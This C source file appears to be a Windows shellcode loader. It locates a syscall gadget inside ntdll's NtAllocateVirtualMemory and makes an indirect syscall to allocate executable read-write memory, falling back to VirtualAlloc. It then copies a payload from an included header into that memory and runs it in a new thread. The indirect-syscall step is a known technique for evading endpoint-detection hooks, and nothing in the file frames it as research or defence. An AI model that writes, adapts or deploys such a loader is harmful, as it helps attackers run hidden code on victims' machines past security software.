#include <windows.h>
#include <stdio.h>
#include "../common/payload.h"
#include "../common/syscall_stubs.h"

int main() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return 1;

    BYTE* pNtAlloc = (BYTE*)GetProcAddress(ntdll, "NtAllocateVirtualMemory");
    if (!pNtAlloc) return 1;

    DWORD ssn = 0;
    if (pNtAlloc[0] == 0x4c && pNtAlloc[1] == 0x8b) {
        ssn = *((DWORD*)(pNtAlloc + 4));
    }

    BYTE* gadget = NULL;
    for (int i = 0; i < 64; i++) {
        if (pNtAlloc[i] == 0x0f && pNtAlloc[i+1] == 0x05 && pNtAlloc[i+2] == 0xc3) {
            gadget = pNtAlloc + i;
            break;
        }
    }

    PVOID base = NULL;
    SIZE_T region_size = payload_len;

    if (ssn && gadget) {
        /* Indirect syscall: NtAllocateVirtualMemory via ntdll gadget */
        NTSTATUS status = sys_indirect_call(
            ssn,
            (void*)gadget,
            (PVOID)(LONG_PTR)-1,
            (PVOID)&base,
            (PVOID)0,
            (PVOID)&region_size,
            (PVOID)(MEM_COMMIT | MEM_RESERVE),
            (PVOID)PAGE_EXECUTE_READWRITE
        );
        if (status != 0 || !base) {
            return 1;
        }
    } else {
        base = VirtualAlloc(0, region_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!base) return 1;
    }

    memcpy(base, payload, payload_len);

    HANDLE th = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)base, NULL, 0, NULL);
    if (th) {
        WaitForSingleObject(th, INFINITE);
        CloseHandle(th);
    }
    return 0;
}
